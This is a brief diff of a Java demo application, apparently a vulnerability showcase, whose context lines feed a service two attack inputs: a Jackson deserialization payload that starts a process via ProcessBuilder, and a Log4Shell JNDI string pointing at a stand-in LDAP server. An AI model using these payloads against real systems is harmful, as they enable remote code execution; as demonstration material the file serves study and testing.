@@ -14,6 +14,7 @@ public class DemoApplication {
         String maliciousJson = "{\"@class\":\"java.lang.AutoCloseable\",\"@type\":\"java.lang.ProcessBuilder\",\"command\":[\"calc\"]}";
         service.jacksonDeserialize(maliciousJson);
 
+
         // Log4j JNDI injection (Log4Shell) example input
         String maliciousLogInput = "${jndi:ldap://malicious-server.com/a}";
         service.log4jJndiInjection(maliciousLogInput);
